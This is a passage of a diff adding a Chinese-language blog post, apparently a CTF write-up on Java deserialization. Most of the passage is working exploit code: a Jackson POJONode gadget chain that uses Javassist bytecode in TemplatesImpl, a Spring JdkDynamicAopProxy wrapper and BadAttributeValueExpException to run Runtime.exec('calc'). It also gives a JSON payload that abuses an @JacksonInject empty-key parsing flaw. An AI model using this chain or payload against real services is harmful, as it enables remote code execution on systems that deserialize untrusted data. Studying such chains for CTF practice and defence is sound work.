+        constructor.set<span class="hljs-constructor">Body(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>)</span>;
+        ctClass.add<span class="hljs-constructor">Constructor(<span class="hljs-params">constructor</span>)</span>;
+        byte<span class="hljs-literal">[]</span> <span class="hljs-built_in">bytes</span> = ctClass.<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>;
+
+        Templates templatesImpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123;<span class="hljs-params">bytes</span>&#125;)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">null</span>)</span>;
+        <span class="hljs-comment">//利用 JdkDynamicAopProxy 进行封装使其稳定触发</span>
+        Class&lt;?&gt; clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>)</span>;
+        Constructor&lt;?&gt; cons = clazz.get<span class="hljs-constructor">DeclaredConstructor(AdvisedSupport.<span class="hljs-params">class</span>)</span>;
+        cons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        AdvisedSupport advisedSupport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AdvisedSupport()</span>;
+        advisedSupport.set<span class="hljs-constructor">Target(<span class="hljs-params">templatesImpl</span>)</span>;
+        InvocationHandler handler = (InvocationHandler) cons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">advisedSupport</span>)</span>;
+        Object proxyObj = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">clazz</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Templates</span>.</span></span><span class="hljs-keyword">class</span>&#125;, handler);
+        POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">proxyObj</span>)</span>;
+
+        BadAttributeValueExpException exp = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(<span class="hljs-params">null</span>)</span>;
+        Field <span class="hljs-keyword">val</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;val&quot;</span>)</span>;
+        <span class="hljs-keyword">val</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        <span class="hljs-keyword">val</span>.set(exp,jsonNodes);
+
+        deserial(serial(exp));
+
+    &#125;
+    <span class="hljs-keyword">private</span> static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">field</span>, Object <span class="hljs-params">arg</span>)</span> throws Exception&#123;
+        Field f = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">field</span>)</span>;
+        f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        f.set(obj, arg);
+    &#125;
+    public static void deserial(String data) throws Exception &#123;
+        byte<span class="hljs-literal">[]</span> base64decodedBytes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(data);
+        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">base64decodedBytes</span>)</span>;
+        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">bais</span>)</span>;
+        ois.read<span class="hljs-constructor">Object()</span>;
+        ois.close<span class="hljs-literal">()</span>;
+    &#125;
+    public static String serial(Object data) throws Exception &#123;
+        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;
+        objectOutputStream.write<span class="hljs-constructor">Object(<span class="hljs-params">data</span>)</span>;
+        objectOutputStream.close<span class="hljs-literal">()</span>;
+        String res = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>);
+        return res;
+    &#125;
+&#125;</code></pre></div>
+
+
+
+<h1 id="题目中出到的有关jackson的一些东西"><a href="#题目中出到的有关jackson的一些东西" class="headerlink" title="题目中出到的有关jackson的一些东西"></a>题目中出到的有关jackson的一些东西</h1><h2 id="JacksonInject"><a href="#JacksonInject" class="headerlink" title="JacksonInject"></a>JacksonInject</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span>
+   <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyBean</span><span class="hljs-params">(<span class="hljs-meta">@JsonProperty(&quot;Base64Code&quot;)</span> String Base64Code, <span class="hljs-meta">@JacksonInject</span> Boolean IfInput)</span> &#123;
+       <span class="hljs-built_in">this</span>.Base64Code = Base64Code;
+       <span class="hljs-built_in">this</span>.IfInput = IfInput;
+   &#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@JsonCreator</span>
+加在构造函数上面用于反序列化
+
+<span class="hljs-variable">@JsonProperty</span>
+指定Json数据中该属性的键名
+<span class="hljs-comment">//上面这个例子为例，即使变量名不叫Base64Code，序列化后该值的键名一定是Base64Code</span>
+
+<span class="hljs-variable">@JacksonInject</span>
+有该注解的属性它的值不能从Json中获取</code></pre></div>
+
+<p><code>IfInput</code>打了<code>@JacksonInject</code>的注解，说明这个属性不能被传入的json数据进行赋值</p>
+<p><code>JsonCreator</code>给<code>IfInput</code>设置的<strong>键</strong>为空，<code>JsonInject</code>将<strong>json串中空键</strong>对应的值<code>true</code>赋给了<code>IfInput</code></p>
+<p>当前版本（未知）下会存在一个Jackson对Json对象的解析漏洞，当传入一个<strong>空键名</strong>时，其键值会被赋值给被<code>@JacksonInject</code>注解标注的属性</p>
+<div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Base64Code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;AAAAAAAA&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div>
+
+
 
 
                 
